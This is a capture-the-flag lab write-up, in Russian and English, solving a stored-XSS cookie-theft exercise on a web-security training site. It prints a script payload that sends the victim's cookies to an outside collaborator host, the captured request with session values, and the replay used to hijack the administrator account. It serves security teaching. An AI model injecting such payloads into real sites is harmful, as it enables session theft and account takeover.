# Exploiting cross-site scripting to steal cookies
PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

## Решение
Подготовлю пейлоад с доменом коллаборатора и оставлю комментарий к первому посту блога:
```
<script>
var x1 = document.createElement('img');
x1.src = "https://nsjzacq4zp3eowulf237yg03eukl8bw0.oastify.com?catpants=" + document.cookie;
document.body.appendChild(x1);
</script>
```
В коллаборатор приходит запрос
```
GET /?catpants=secret=WzGnBkScbLu5hagFVYav56CEA42jbYat;%20session=BlEo0zEBfwxqBwpJQjM1NDmPxPTXBUEl HTTP/1.1
Host: c8loq16tfej34laavrjwe5gsuj0ao5cu.oastify.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a8800090448678d80ce301c002e00da.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
Отправлю запрос к `/my-account`, подставив полученные кукисы:
```
GET /my-account HTTP/2
Host: 0a8800090448678d80ce301c002e00da.web-security-academy.net
Cookie: catpants=secret=WzGnBkScbLu5hagFVYav56CEA42jbYat; session=BlEo0zEBfwxqBwpJQjM1NDmPxPTXBUEl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8800090448678d80ce301c002e00da.web-security-academy.net/post?postId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
В ответе видно, что сервер обработал запрос и вывел имя пользователя ("administrator"). Задание выполнено.
